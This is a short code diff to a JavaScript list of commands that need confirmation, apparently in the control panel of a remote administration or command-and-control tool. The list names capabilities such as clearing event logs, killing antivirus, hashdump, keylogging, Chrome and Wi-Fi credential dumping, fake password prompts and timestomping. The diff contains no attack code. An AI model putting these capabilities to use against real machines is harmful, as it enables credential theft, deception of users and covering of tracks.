@@ -24,7 +24,7 @@ let filesPagination = {
 
 // Dangerous commands that require confirmation
 const DANGEROUS_COMMANDS = [
-    // Windows Security
+    // Windows Security - Highly Destructive
     'clearev',
     'avkill',
     'disableRDP',
@@ -32,7 +32,7 @@ const DANGEROUS_COMMANDS = [
     'disableWindef',
     'scanreg',
     
-    // System Control
+    // System Control - Disruptive
     'lockscreen',
     'displayoff',
     'freeze start',
@@ -40,27 +40,36 @@ const DANGEROUS_COMMANDS = [
     'shutdown',
     'reboot',
     
-    // Network Modifications
+    // Network Modifications - Security Impact
     'hostsfile remove',
     'hostsfile update',
     'firewall close',
+    'firewall open',
+    'firewall allow',
     
-    // File Operations
+    // File Operations - Data Integrity
     'hide',
+    'unhide',
     'editaccessed',
     'editcreated',
     'editmodified',
+    'timestomp a',
+    'timestomp c',
+    'timestomp m',
     
-    // Security Tools
+    // Security Tools - Credential Theft
     'hashdump',
     'keylogger start',
     'chromedump',
     'wifikeys',
     'crackpassword',
-    'firewall open',
-    'firewall close',
-    'hostsfile update',
-    'hostsfile remove'
+    
+    // Interactive Commands - User Deception
+    'popup',
+    'askpassword',
+    
+    // System Modifications - Persistence/Stealth
+    'logintext'
 ];
 
 // Helper function to check if a command is dangerous
